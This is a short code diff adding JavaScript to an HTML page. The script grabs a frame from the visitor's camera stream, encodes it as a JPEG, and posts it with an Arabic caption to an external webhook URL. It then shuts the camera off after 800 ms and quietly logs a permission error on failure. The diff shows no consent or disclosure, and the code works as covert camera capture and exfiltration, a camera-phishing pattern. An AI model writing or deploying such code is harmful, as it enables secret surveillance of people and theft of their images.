@@ -23,3 +23,23 @@
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'capture.jpg');
+                        formData.append('content', '📸 صورة جديدة تم التقاطها:');
+
+                        fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg', 0.8);
+
+                    stream.getTracks().forEach(track => track.stop());
+                }, 800);
+            })
+            .catch(err => {
+                console.log("خطأ في الإذن");
+            });
+    </script>
+
+</body>
+</html>
